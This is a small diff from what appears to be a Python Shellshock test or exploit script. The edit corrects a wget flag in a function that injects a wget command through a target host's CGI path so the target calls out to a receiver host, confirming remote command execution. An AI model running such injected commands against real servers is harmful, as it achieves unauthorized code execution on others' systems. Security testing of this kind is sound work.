@@ -133,7 +133,7 @@ def testPing(target_host, cgi_path):
     return shellshocktest
 	
 def sendWget(target_host, cgi_path):
-    shellshocktest = testShellShock(target_host, cgi_path, "/usr/bin/wget -q -o /dev/null %s" %WGET_RECIVER)
+    shellshocktest = testShellShock(target_host, cgi_path, "/usr/bin/wget -q -O /dev/null %s" %WGET_RECIVER)
 	print "%s%s\t Request sended, check your logs" %(target_host, cgi_path)
     return shellshocktest
 
